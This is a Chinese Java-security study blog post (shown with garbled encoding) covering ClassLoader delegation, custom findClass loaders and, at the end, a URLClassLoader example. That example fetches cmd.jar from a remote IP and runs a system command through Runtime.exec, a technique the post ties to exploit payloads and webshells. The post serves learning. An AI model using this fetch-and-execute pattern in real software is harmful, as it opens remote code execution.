<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>JAVAå®‰å…¨å­¦ä¹ ç¬”è®°ï¼ˆ1ï¼‰ | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="JAVAå®‰å…¨å­¦ä¹ ç¬”è®°ï¼ˆ1ï¼‰ | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="ClassLoader
åŸºç¡€çš„åŸºç¡€
Java &amp; JVM
.javaæ–‡æœ¬æ–‡ä»¶ -&gt; .classå­—èŠ‚ç  -&gt; JVMæ‰§è¡Œ
ç¼–è¯‘ javac TestHelloWorld.java
åç¼–è¯‘ javap -c -l -p s..." />
    <meta name="keywords" content="JAVA,å­¦ä¹ ç¬”è®°" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              JAVAå®‰å…¨å­¦ä¹ ç¬”è®°ï¼ˆ1ï¼‰
            </h2>
            <div class="post-info">
              <span>
                2023-09-17
              </span>
              <span>
                28 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/RwDqGW2an/" class="post-tag">
                  # JAVA
                </a>
              
                <a href="https://skyblu3519.github.io/tag/SBvbIXKgV/" class="post-tag">
                  # å­¦ä¹ ç¬”è®°
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/java-an-quan-xue-xi-bi-ji.jpg" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="classloader">ClassLoader</h1>
<h2 id="åŸºç¡€çš„åŸºç¡€">åŸºç¡€çš„åŸºç¡€</h2>
<p>Java &amp; JVM<br>
.javaæ–‡æœ¬æ–‡ä»¶ -&gt; .classå­—èŠ‚ç  -&gt; JVMæ‰§è¡Œ</p>
<p>ç¼–è¯‘ javac TestHelloWorld.java<br>
åç¼–è¯‘ javap -c -l -p src/test/TestHelloWorld.class ï¼ˆJVMå­—èŠ‚ç ï¼‰<br>
<img src="https://skyblu3519.github.io/post-images/1694964925269.png" alt="" loading="lazy"><br>
æŸ¥çœ‹äºŒè¿›åˆ¶å†…å®¹ hexdump -c src/test/TestHelloWorld.class</p>
<p>ä¸€åˆ‡çš„<strong>Javaç±»ï¼ˆ.classæ–‡ä»¶ï¼‰<strong>éƒ½å¿…é¡»ç»è¿‡JVMåŠ è½½åæ‰èƒ½è¿è¡Œï¼Œè€ŒClassLoaderçš„ä¸»è¦ä½œç”¨å°±æ˜¯</strong>Javaç±»æ–‡ä»¶çš„åŠ è½½</strong>ã€‚åœ¨JVMç±»åŠ è½½å™¨ä¸­æœ€é¡¶å±‚çš„æ˜¯ï¼š</p>
<ul>
<li>Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰</li>
<li>Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰</li>
<li>App ClassLoaderï¼ˆç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰é»˜è®¤çš„åŠ è½½å™¨</li>
</ul>
<p>**ClassLoader.getSystemClassLoader()**è¿”å›çš„ç³»ç»Ÿç±»åŠ è½½å™¨ä¹Ÿæ˜¯AppClassLoaderã€‚</p>
<p>æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ª<strong>ClassLoader</strong>ï¼Œå°è¯•è·å–è¢«<strong>Bootstrap ClassLoader</strong>ç±»åŠ è½½å™¨æ‰€åŠ è½½çš„ç±»çš„ClassLoaderæ—¶å€™éƒ½ä¼šè¿”å›nullã€‚</p>
<p>javaç±»åŠ è½½æ–¹å¼ï¼š</p>
<ul>
<li>æ˜¾å¼ï¼šJavaåå°„ã€ClassLoader **åŠ¨æ€åŠ è½½ **è‡ªå®šä¹‰ç±»åŠ è½½å™¨å»åŠ è½½ä»»æ„çš„ç±»</li>
<li>éšå¼ï¼š<strong>ç±»å.æ–¹æ³•å()</strong>ã€<strong>newç±»å®ä¾‹</strong></li>
</ul>
<p><strong>å¸¸ç”¨çš„ç±»åŠ¨æ€åŠ è½½æ–¹å¼ï¼š</strong></p>
<pre><code class="language-java">// åå°„åŠ è½½TestHelloWorldç¤ºä¾‹
Class.forName(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);

// ClassLoaderåŠ è½½TestHelloWorldç¤ºä¾‹
this.getClass().getClassLoader().loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);
</code></pre>
<p><strong>Class.forName(&quot;ç±»å&quot;) <strong>é»˜è®¤ä¼šåˆå§‹åŒ–è¢«åŠ è½½ç±»çš„é™æ€å±æ€§å’Œæ–¹æ³•ï¼Œå¦‚æœä¸å¸Œæœ›åˆå§‹åŒ–ç±»å¯ä»¥ä½¿ç”¨</strong>Class.forName(&quot;ç±»å&quot;, æ˜¯å¦åˆå§‹åŒ–ç±», ç±»åŠ è½½å™¨)</strong>ï¼Œè€ŒClassLoader.loadClassé»˜è®¤<strong>ä¸ä¼šåˆå§‹åŒ–ç±»æ–¹æ³•</strong>ã€‚</p>
<h2 id="classloaderç±»åŠ è½½æµç¨‹">ClassLoaderç±»åŠ è½½æµç¨‹</h2>
<p><img src="https://skyblu3519.github.io/post-images/1694964938530.png" alt="" loading="lazy"><br>
<strong>1 æ£€æŸ¥ç±»æ˜¯å¦å·²åŠ è½½</strong><br>
é¦–å…ˆï¼Œå®ƒè°ƒç”¨<strong>findLoadedClass</strong>æ–¹æ³•æ¥æ£€æŸ¥è¯¥ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½åˆ°å†…å­˜ä¸­ã€‚å¦‚æœå·²åŠ è½½ï¼Œåˆ™ç›´æ¥è¿”å›è¯¥ç±»çš„<strong>Class</strong>å¯¹è±¡ã€‚</p>
<p><strong>2 ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨</strong><br>
å¦‚æœç±»è¿˜æ²¡æœ‰è¢«åŠ è½½ï¼Œåˆ™æ£€æŸ¥æ˜¯å¦æœ‰çˆ¶ç±»åŠ è½½å™¨å­˜åœ¨ã€‚å¦‚æœæœ‰ï¼Œå®ƒä¼šå°è¯•ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨æ¥åŠ è½½è¿™ä¸ªç±»ã€‚å¦‚æœçˆ¶ç±»åŠ è½½å™¨å¯ä»¥åŠ è½½è¿™ä¸ªç±»ï¼Œå®ƒå°±ä¼šè¿™æ ·åšï¼Œå¦åˆ™ï¼Œæµç¨‹ä¼šç»§ç»­ã€‚</p>
<p><strong>3 ä½¿ç”¨Bootstrap ClassLoader</strong><br>
å¦‚æœæ²¡æœ‰çˆ¶ç±»åŠ è½½å™¨æˆ–çˆ¶ç±»åŠ è½½å™¨æ— æ³•åŠ è½½è¯¥ç±»ï¼Œé‚£ä¹ˆå°†ä½¿ç”¨Bootstrap ClassLoaderæ¥å°è¯•åŠ è½½å®ƒã€‚Bootstrap ClassLoaderæ˜¯JVMçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå¯ä»¥åŠ è½½æ ¸å¿ƒJavaç±»åº“ï¼ˆæ¯”å¦‚<strong>java.lang.</strong>*ï¼‰ã€‚</p>
<p><strong>4 ä½¿ç”¨å½“å‰ç±»åŠ è½½å™¨çš„ findClass æ–¹æ³•</strong><br>
å¦‚æœå‰é¢çš„æ­¥éª¤éƒ½å¤±è´¥äº†ï¼Œé‚£ä¹ˆå®ƒä¼šè°ƒç”¨å½“å‰ç±»åŠ è½½å™¨çš„<strong>findClass</strong>æ–¹æ³•æ¥å°è¯•åŠ è½½è¿™ä¸ªç±»ã€‚è¿™æ˜¯ä½ å¯ä»¥è¦†å†™çš„ä¸€ä¸ªæ–¹æ³•ï¼Œä»¥å®ç°ä½ è‡ªå·±çš„ç±»åŠ è½½é€»è¾‘ã€‚</p>
<p><strong>5 è°ƒç”¨ defineClass æ–¹æ³•</strong><br>
å¦‚æœ<strong>findClass</strong>æ–¹æ³•æ‰¾åˆ°äº†ç±»çš„å­—èŠ‚ç ï¼Œå®ƒåº”è¯¥ä½¿ç”¨<strong>defineClass</strong>æ–¹æ³•æ¥æ³¨å†Œè¿™ä¸ªç±»åˆ°JVMä¸­ã€‚<br>
6 é“¾æ¥ç±»<br>
æœ€åï¼Œå¦‚æœ<strong>loadClass</strong>æ–¹æ³•è¢«è°ƒç”¨æ—¶ä¼ é€’çš„<strong>resolve</strong>å‚æ•°æ˜¯<strong>true</strong>ï¼Œå®ƒè¿˜å°†è°ƒç”¨<strong>resolveClass</strong>æ–¹æ³•æ¥é“¾æ¥è¿™ä¸ªç±»ã€‚é“¾æ¥ç¡®ä¿ç±»å¯ä»¥è¢«æ­£ç¡®ä½¿ç”¨ï¼Œå®ƒæ¶‰åŠéªŒè¯ç±»æ–‡ä»¶å’Œåˆå§‹åŒ–é™æ€å˜é‡ç­‰æ­¥éª¤ã€‚</p>
<h2 id="è‡ªå®šä¹‰classloader">è‡ªå®šä¹‰ClassLoader</h2>
<p>é”™è¯¯è®°å½•</p>
<pre><code class="language-java">âœ  src javac test/TestClassLoader.java
test/TestClassLoader.java:2: é”™è¯¯: æ‰¾ä¸åˆ°ç¬¦å·
import test.TestHelloWorld;
           ^
  ç¬¦å·:   ç±» TestHelloWorld
  ä½ç½®: ç¨‹åºåŒ… test
test/TestClassLoader.java:6: é”™è¯¯: æ‰¾ä¸åˆ°ç¬¦å·
        TestHelloWorld t = new TestHelloWorld();
        ^
  ç¬¦å·:   ç±» TestHelloWorld
  ä½ç½®: ç±» TestClassLoader
test/TestClassLoader.java:6: é”™è¯¯: æ‰¾ä¸åˆ°ç¬¦å·
        TestHelloWorld t = new TestHelloWorld();
                               ^
  ç¬¦å·:   ç±» TestHelloWorld
  ä½ç½®: ç±» TestClassLoader
3 ä¸ªé”™è¯¯

</code></pre>
<p>é‡åˆ°è¿™ç§é—®é¢˜é€šå¸¸æ˜¯ç”±äºç¼–è¯‘æ—¶ç±»è·¯å¾„ï¼ˆclasspathï¼‰çš„é—®é¢˜ã€‚ç¼–è¯‘æ—¶ï¼Œ<strong>javac</strong>éœ€è¦çŸ¥é“åœ¨å“ªé‡Œå¯ä»¥æ‰¾åˆ°æ‰€æœ‰éœ€è¦çš„ç±»ã€‚å½“ä½ ç¼–è¯‘<strong>TestClassLoader.java</strong>æ—¶ï¼Œå®ƒéœ€è¦èƒ½å¤Ÿæ‰¾åˆ°<strong>TestHelloWorld.class</strong>æ–‡ä»¶ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½ å¯ä»¥å°è¯•åœ¨ç¼–è¯‘<strong>TestClassLoader.java</strong>æ—¶æŒ‡å®šç±»è·¯å¾„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œç±»è·¯å¾„åº”è¯¥åŒ…å«å½“å‰ç›®å½•ï¼ˆ<strong>.</strong>ï¼‰ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®ƒå¯èƒ½æ²¡æœ‰è¢«æ­£ç¡®è®¾ç½®ã€‚</p>
<p>ä½ å¯ä»¥é€šè¿‡æ·»åŠ **-cp .**å‚æ•°æ¥æŒ‡å®šç±»è·¯å¾„ï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code class="language-java">javac -cp . test/TestClassLoader.java
</code></pre>
<p>è¿™ä¸ªå‘½ä»¤å‘Šè¯‰<strong>javac</strong>åœ¨å½“å‰ç›®å½•ä¸­æŸ¥æ‰¾ç±»æ–‡ä»¶ã€‚</p>
<p>å†™ä¸€ä¸ª<strong>TestClassLoaderï¼Œå¦‚æœå’ŒTestHelloWorldåœ¨ä¸€ä¸ªclasspathä¸‹å¯ä»¥ç›´æ¥åŠ è½½</strong></p>
<pre><code class="language-java">package test;

public class TestClassLoader {
    public static void main(String[] args) {
        TestHelloWorld t = new TestHelloWorld();
        String str = t.hello();
        System.out.print(str);
    }
}

</code></pre>
<h3 id="é‡å†™findclass">é‡å†™findClass</h3>
<p>è·å–<strong>TestHelloWorldçš„å­—èŠ‚ç ï¼Œå†™ä¸€ä¸ª</strong></p>
<pre><code class="language-java">package test;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;

public class GetByteCode {
    public static void main(String[] args) {
        try {
            byte[] bytecode = Files.readAllBytes(Path.of(&quot;./test/TestHelloWorld.class&quot;));

            // å°†å­—èŠ‚ç æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶æ‰“å°åˆ°æ§åˆ¶å°
            System.out.println(Arrays.toString(bytecode));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}


</code></pre>
<p>ç„¶åï¼Œå¦‚æœå½“å‰è·¯å¾„ä¸‹æ²¡æœ‰<strong>TestHelloWorldï¼Œ<strong>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨</strong>è‡ªå®šä¹‰ç±»</strong>åŠ è½½å™¨é‡å†™<strong>findClass</strong>æ–¹æ³•ï¼Œç„¶ååœ¨è°ƒç”¨<strong>defineClass</strong>æ–¹æ³•çš„æ—¶å€™ä¼ å…¥<strong>TestHelloWorldç±»çš„å­—èŠ‚ç </strong>çš„æ–¹å¼æ¥å‘JVMä¸­å®šä¹‰ä¸€ä¸ªTestHelloWorldç±»ï¼Œæœ€åé€šè¿‡<strong>åå°„æœºåˆ¶</strong>å°±å¯ä»¥è°ƒç”¨TestHelloWorldç±»çš„helloæ–¹æ³•äº†ã€‚</p>
<p>æµ‹è¯•ä»£ç ï¼š</p>
<pre><code class="language-java">package test;

import java.lang.reflect.Method;

public class DecoyClassLoader extends  ClassLoader{
    private static String testClassName = &quot;test.TestHelloWorld&quot;;

    private static byte[] testClassBytes = new byte[]{
            // è¿™é‡Œè´´é’±å—çš„å­—èŠ‚ç 
    };

    @Override
    public Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
        // åªå¤„ç†TestHelloWorldç±»
        if (name.equals(testClassName)) {
            // è°ƒç”¨JVMçš„nativeæ–¹æ³•å®šä¹‰TestHelloWorldç±»
            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
        }

        return super.findClass(name);
    }

    public static void main(String[] args) {
        DecoyClassLoader loader = new DecoyClassLoader();

        try {
            // ä½¿ç”¨è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨åŠ è½½TestHelloWorldç±»
            Class testClass = loader.loadClass(testClassName);

            // åå°„åˆ›å»ºTestHelloWorldç±»ï¼Œç­‰ä»·äº TestHelloWorld t = new TestHelloWorld();
            Object testInstance = testClass.newInstance();

            // åå°„è·å–helloæ–¹æ³•
            Method method = testInstance.getClass().getMethod(&quot;hello&quot;);

            // åå°„è°ƒç”¨helloæ–¹æ³•,ç­‰ä»·äº String str = t.hello();
            String str = (String) method.invoke(testInstance);

            System.out.println(str);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}

</code></pre>
<ul>
<li>ä½ åˆ›å»ºäº†ä¸€ä¸ªåä¸º<strong>DecoyClassLoader</strong>çš„ç±»ï¼Œè¯¥ç±»ç»§æ‰¿äº†<strong>ClassLoader</strong>ç±»ã€‚å®šä¹‰äº†ä¸¤ä¸ªç§æœ‰é™æ€å˜é‡æ¥å­˜å‚¨ä½ æƒ³è¦åŠ è½½çš„ç±»çš„åå­—å’Œå­—èŠ‚ç ã€‚</li>
<li>ä½ é‡å†™äº†<strong>findClass</strong>æ–¹æ³•æ¥å®šåˆ¶ç±»çš„åŠ è½½è¿‡ç¨‹ã€‚å¦‚æœè¯·æ±‚çš„ç±»åä¸ä½ æƒ³è¦åŠ è½½çš„ç±»ååŒ¹é…ï¼Œåˆ™ä½¿ç”¨<strong>defineClass</strong>æ–¹æ³•æ¥å®šä¹‰è¯¥ç±»ï¼Œä¼ é€’ç±»åå’Œå­—èŠ‚ç æ•°ç»„æ¥åˆ›å»ºä¸€ä¸ª<strong>Class</strong>å¯¹è±¡ã€‚</li>
<li>åœ¨<strong>main</strong>æ–¹æ³•ä¸­ï¼Œä½ åˆ›å»ºäº†<strong>DecoyClassLoader</strong>çš„ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥åŠ è½½ä½ çš„ç›®æ ‡ç±»ã€‚ä¸€æ—¦ç±»è¢«åŠ è½½ï¼Œä½ å°±ä½¿ç”¨åå°„æ¥åˆ›å»ºè¯¥ç±»çš„ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶è°ƒç”¨å…¶<strong>hello</strong>æ–¹æ³•ã€‚</li>
</ul>
<p><strong>è¿è¡Œæ—¶èƒŒåçš„æµç¨‹</strong></p>
<ol>
<li><strong>ç±»çš„åŠ è½½</strong>å½“ä½ è¿è¡Œç¨‹åºæ—¶ï¼ŒJVMé¦–å…ˆä¼šåŠ è½½<strong>DecoyClassLoader</strong>ç±»ï¼ˆé€šè¿‡é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼‰ã€‚</li>
<li><strong>åˆ›å»ºDecoyClassLoaderå®ä¾‹</strong>åœ¨<strong>main</strong>æ–¹æ³•ä¸­åˆ›å»º<strong>DecoyClassLoader</strong>çš„ä¸€ä¸ªå®ä¾‹ã€‚</li>
<li><strong>åŠ è½½TestHelloWorldç±»</strong>ä½¿ç”¨<strong>DecoyClassLoader</strong>å®ä¾‹æ¥åŠ è½½<strong>TestHelloWorld</strong>ç±»ã€‚å®ƒé¦–å…ˆå°è¯•æ‰¾åˆ°å·²åŠ è½½çš„ç±»ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™å°è¯•ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨åŠ è½½å®ƒã€‚å¦‚æœçˆ¶ç±»åŠ è½½å™¨ä¹Ÿæ— æ³•åŠ è½½è¯¥ç±»ï¼Œåˆ™è°ƒç”¨<strong>findClass</strong>æ–¹æ³•æ¥åŠ è½½å®ƒã€‚</li>
<li><strong>ç±»çš„å®ä¾‹åŒ–å’Œæ–¹æ³•è°ƒç”¨</strong>ä¸€æ—¦<strong>TestHelloWorld</strong>ç±»è¢«åŠ è½½ï¼Œå°±ä½¿ç”¨åå°„æ¥åˆ›å»ºå…¶ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶è°ƒç”¨å…¶<strong>hello</strong>æ–¹æ³•æ¥è·å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åæ‰“å°è¯¥å­—ç¬¦ä¸²ã€‚</li>
</ol>
<p>è¡¥å……ä¸€äº›çŸ¥è¯†<br>
<strong>Javaç±»åŠ è½½å™¨ (ClassLoader)</strong></p>
<ol>
<li><strong>ç±»åŠ è½½å™¨çš„å·¥ä½œåŸç†</strong>
<ul>
<li><strong>åŠ è½½</strong>: é€šè¿‡è¯»å– <strong>.class</strong> æ–‡ä»¶æˆ–å…¶ä»–æ–¹å¼æ¥è·å–ç±»çš„å­—èŠ‚ç ã€‚</li>
<li><strong>é“¾æ¥</strong>: éªŒè¯å­—èŠ‚ç ç»“æ„çš„æ­£ç¡®æ€§ï¼Œä¸ºé™æ€å­—æ®µåˆ†é…å†…å­˜ï¼Œå°†ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨ç­‰ã€‚</li>
<li><strong>åˆå§‹åŒ–</strong>: æ‰§è¡Œç±»çš„åˆå§‹åŒ–ä»£ç ï¼Œå¦‚é™æ€å—ç­‰ã€‚</li>
</ul>
</li>
<li><strong>è‡ªå®šä¹‰ç±»åŠ è½½å™¨</strong>
<ul>
<li>å¯ä»¥é€šè¿‡ç»§æ‰¿ <strong>ClassLoader</strong> ç±»æ¥åˆ›å»ºè‡ªå®šä¹‰ç±»åŠ è½½å™¨ã€‚</li>
<li>éœ€è¦é‡å†™ <strong>findClass</strong> æ–¹æ³•æ¥å®šä¹‰å¦‚ä½•åŠ è½½ç±»ã€‚</li>
</ul>
</li>
<li><strong>Bootstrap ClassLoader</strong>
<ul>
<li>JVMçš„å†…å»ºç±»åŠ è½½å™¨ï¼Œç”¨äºåŠ è½½æ ¸å¿ƒJavaç±»åº“ã€‚</li>
</ul>
</li>
</ol>
<p><strong>Java åå°„ (Reflection)</strong></p>
<ol>
<li><strong>åå°„çš„æ¦‚å¿µ</strong>
<ul>
<li>å…è®¸ä½ åœ¨è¿è¡Œæ—¶æ£€æŸ¥å’Œä¿®æ”¹ç¨‹åºçš„è¡Œä¸ºã€‚</li>
</ul>
</li>
<li><strong>åå°„çš„ç”¨é€”</strong>
<ul>
<li>åŠ¨æ€åŠ è½½ç±»ã€‚</li>
<li>åœ¨è¿è¡Œæ—¶è·å–ç±»çš„ä¿¡æ¯ï¼ˆå¦‚æ–¹æ³•ï¼Œå­—æ®µç­‰ï¼‰ã€‚</li>
<li>åŠ¨æ€è°ƒç”¨æ–¹æ³•ã€‚</li>
</ul>
</li>
<li><strong>Class ç±»</strong>
<ul>
<li>è¡¨ç¤ºæ­£åœ¨è¿è¡Œçš„ Java åº”ç”¨ç¨‹åºä¸­çš„ç±»å’Œæ¥å£ã€‚</li>
</ul>
</li>
<li><strong>åˆ›å»ºç±»çš„å®ä¾‹</strong>
<ul>
<li><strong>Class.newInstance</strong> æ–¹æ³•ç”¨äºåˆ›å»ºç±»çš„å®ä¾‹ã€‚</li>
</ul>
</li>
<li><strong>è·å–å’Œè°ƒç”¨æ–¹æ³•</strong>
<ul>
<li>ä½¿ç”¨ <strong>Class.getMethod</strong> æ¥è·å–ç‰¹å®šçš„æ–¹æ³•ã€‚</li>
<li>ä½¿ç”¨ <strong>Method.invoke</strong> æ¥è°ƒç”¨ä¸€ä¸ªæ–¹æ³•ã€‚</li>
</ul>
</li>
</ol>
<p><strong>Javaæ–¹æ³•ç­¾å</strong></p>
<ol>
<li><strong>æ³›å‹æ–¹æ³•ç­¾å</strong>
<ul>
<li><strong>public Class<?> loadClass(String name)** ä¸­çš„ **<?></strong> è¡¨ç¤ºä¸€ä¸ªæœªçŸ¥çš„æ³›å‹ç±»å‹ã€‚</li>
</ul>
</li>
</ol>
<h2 id="urlclassloader">URLClassLoader</h2>
<p><strong>.jar</strong> æ–‡ä»¶æ˜¯ Java ARchive æ–‡ä»¶çš„ç®€ç§°ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŒ…å«å¤šä¸ª Java ç±»æ–‡ä»¶å’Œç›¸å…³çš„å…ƒæ•°æ®å’Œèµ„æºï¼ˆæ–‡æœ¬ã€å›¾ç‰‡ç­‰ï¼‰çš„æ–‡ä»¶ã€‚å®ƒåŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ª ZIP æ–‡ä»¶ï¼Œå…¶å†…éƒ¨ç»“æ„å’Œ ZIP æ–‡ä»¶ç›¸åŒã€‚<br>
åœ¨ Java å¼€å‘ä¸­ï¼Œ<strong>.jar</strong> æ–‡ä»¶é€šå¸¸ç”¨äºæ‰“åŒ…å¤šä¸ªç±»æ–‡ä»¶å’Œç›¸å…³èµ„æºï¼Œä½¿å…¶å¯ä»¥ä½œä¸ºä¸€ä¸ªæ–‡ä»¶è½»æ¾åˆ†å‘å’Œç®¡ç†ã€‚ä½ å¯ä»¥å°†å®ƒçœ‹ä½œæ˜¯ä¸€ä¸ªç±»åº“æˆ–åº”ç”¨ç¨‹åºçš„é›†åˆï¼Œå®ƒåŒ…å«æ‰€æœ‰ä½ éœ€è¦è¿è¡Œ Java åº”ç”¨ç¨‹åºæˆ–ä½¿ç”¨ Java ç±»åº“çš„ä¸œè¥¿ã€‚</p>
<p>ä½ å¯ä»¥ä½¿ç”¨ <strong>jar</strong> å‘½ä»¤è¡Œå·¥å…·åˆ›å»º <strong>.jar</strong> æ–‡ä»¶ï¼Œè¯¥å·¥å…·åŒ…å«åœ¨ JDK ä¸­ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹å‘½ä»¤å°† <strong>MyClass.class</strong> å’Œ <strong>MyResource.txt</strong> æ–‡ä»¶æ‰“åŒ…åˆ°ä¸€ä¸ªåä¸º <strong>myjar.jar</strong> çš„ <strong>.jar</strong> æ–‡ä»¶ä¸­ï¼š</p>
<pre><code class="language-java">jar cvf myjar.jar MyClass.class MyResource.txt
</code></pre>
<p>è¿è¡Œ</p>
<pre><code>java -jar myjar.jar
</code></pre>
<p>CMD.java</p>
<pre><code class="language-java">import java.io.IOException;

public class CMD {

    public static Process exec(String cmd) throws IOException {
        return Runtime.getRuntime().exec(cmd);
    }

}
</code></pre>
<pre><code class="language-java">javac CMD.java
jar cvf cmd.jar CMD.class 
</code></pre>
<p>URLClassLoaderç»§æ‰¿äº†ClassLoaderï¼ŒURLClassLoaderæä¾›äº†åŠ è½½è¿œç¨‹èµ„æºçš„èƒ½åŠ›ï¼Œåœ¨å†™æ¼æ´åˆ©ç”¨çš„payloadæˆ–è€…webshellçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§æ¥åŠ è½½è¿œç¨‹çš„jaræ¥å®ç°è¿œç¨‹çš„ç±»æ–¹æ³•è°ƒç”¨ã€‚</p>
<pre><code class="language-java">package test;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;

public class TestURLClassLoader {

    public static void main(String[] args) {
        try {
            // å®šä¹‰è¿œç¨‹åŠ è½½çš„jarè·¯å¾„
            URL url = new URL(&quot;http://10.211.55.12/cmd.jar&quot;);

            // åˆ›å»ºURLClassLoaderå¯¹è±¡ï¼Œå¹¶åŠ è½½è¿œç¨‹jaråŒ…
            URLClassLoader ucl = new URLClassLoader(new URL[]{url});

            // å®šä¹‰éœ€è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤
            String cmd = &quot;ls&quot;;

            // é€šè¿‡URLClassLoaderåŠ è½½è¿œç¨‹jaråŒ…ä¸­çš„CMDç±»
            Class cmdClass = ucl.loadClass(&quot;CMD&quot;);

            // è°ƒç”¨CMDç±»ä¸­çš„execæ–¹æ³•ï¼Œç­‰ä»·äº: Process process = CMD.exec(&quot;whoami&quot;);
            Process process = (Process) cmdClass.getMethod(&quot;exec&quot;, String.class).invoke(null, cmd);

            // è·å–å‘½ä»¤æ‰§è¡Œç»“æœçš„è¾“å…¥æµ
            InputStream           in   = process.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[]                b    = new byte[1024];
            int                   a    = -1;

            // è¯»å–å‘½ä»¤æ‰§è¡Œç»“æœ
            while ((a = in.read(b)) != -1) {
                baos.write(b, 0, a);
            }

            // è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ
            System.out.println(baos.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

</code></pre>
<p>è¿™é‡Œ<code>newURL[]{url}</code></p>
<ol>
<li><strong>new URL[]</strong>: è¿™æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„URLå¯¹è±¡æ•°ç»„çš„è¯­æ³•ã€‚å®ƒåˆ›å»ºä¸€ä¸ªURLæ•°ç»„ã€‚</li>
<li><strong>{url}</strong>: è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨èŠ±æ‹¬å· <strong>{}</strong> æ¥åˆå§‹åŒ–æ•°ç»„ã€‚æˆ‘ä»¬å°†<strong>url</strong>å¯¹è±¡æ”¾å…¥èŠ±æ‹¬å·ä¸­ï¼Œè¡¨ç¤ºè¿™ä¸ªæ•°ç»„çš„ç¬¬ä¸€ä¸ªï¼ˆä¹Ÿæ˜¯å”¯ä¸€çš„ï¼‰å…ƒç´ æ˜¯<strong>url</strong>å¯¹è±¡ã€‚</li>
</ol>
<p>æ‰€ä»¥æ•´ä½“æ¥è¯´ï¼Œ<strong>new URL[]{url}<strong>åˆ›å»ºäº†ä¸€ä¸ªåŒ…å«ä¸€ä¸ªå…ƒç´ çš„URLæ•°ç»„ï¼Œè¯¥å…ƒç´ å°±æ˜¯æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„</strong>url</strong>å¯¹è±¡ã€‚<br>
